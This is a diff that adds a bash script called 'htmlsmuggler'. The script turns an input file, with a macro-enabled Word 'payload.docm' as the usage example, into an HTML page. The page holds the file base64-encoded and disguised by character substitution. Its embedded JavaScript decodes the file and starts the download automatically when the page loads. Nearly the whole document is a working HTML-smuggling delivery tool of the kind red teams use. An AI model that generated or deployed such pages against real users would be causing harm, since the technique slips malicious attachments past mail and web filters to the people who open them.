@@ -1,0 +1,89 @@
+#!/usr/bin/env bash
+#
+# htmlsmuggler
+#
+# Create HTML file for HTML smuggling content
+#
+# Author: Emanuel Duss
+#
+
+set -o errexit
+set -o nounset
+set -o pipefail
+
+print_usage(){
+cat << EOI
+Usage: htmlsmuggler payload.docm
+EOI
+}
+
+generate_payload(){
+
+FILENAME="$(basename "$INPUTFILE")"
+TYPE="$(file -b --mime-type "$INPUTFILE")"
+PAYLOAD="$(base64 -w0 "$INPUTFILE" | tr 'AaZz+/=' '@_()%?$')"
+HASH="$(sha256sum "$INPUTFILE" | cut -d ' ' -f 1)"
+
+cat << EOI
+<html>
+<head><title>Simple HTML Smuggler</title></head>
+<body>
+<h1>Simple HTML Smuggler</h1>
+<p>File: $FILENAME<br/>SHA256: $HASH</p>
+<script>
+  function base64toarray(base64) {
+    var bin_string = window.atob(base64);
+    var len = bin_string.length;
+    var bytes = new Uint8Array(len);
+    for (var i = 0; i < len; i++) {
+      bytes[i] = bin_string.charCodeAt(i);
+    }
+    return bytes.buffer;
+  }
+
+  function deobfuscate(payload){
+    return payload
+      .replaceAll('@', 'A')
+      .replaceAll('_', 'a')
+      .replaceAll('(', 'Z')
+      .replaceAll(')', 'z')
+      .replaceAll('%', '+')
+      .replaceAll('?', '/')
+      .replaceAll('$', '=');
+  }
+
+  var payload = '$PAYLOAD'
+  var type = '$TYPE';
+  var filename = '$FILENAME'
+
+  var data = base64toarray(deobfuscate(payload));
+  var blob = new Blob([data], {type: type});
+
+  var a = document.createElement('a');
+  document.body.appendChild(a);
+  var url = window.URL.createObjectURL(blob);
+  a.href = url;
+  a.download = filename;
+  a.click();
+  window.URL.revokeObjectURL(url);
+</script>
+</body>
+</html>
+EOI
+}
+
+main(){
+  if [[ -z "${1:-}" ]]
+  then
+    print_usage
+    exit 1
+  fi
+
+  TEMPLATE="template.html"
+  INPUTFILE="$1"
+  OUTPUTFILE="$INPUTFILE.html"
+
+  generate_payload
+}
+
+main "$@"
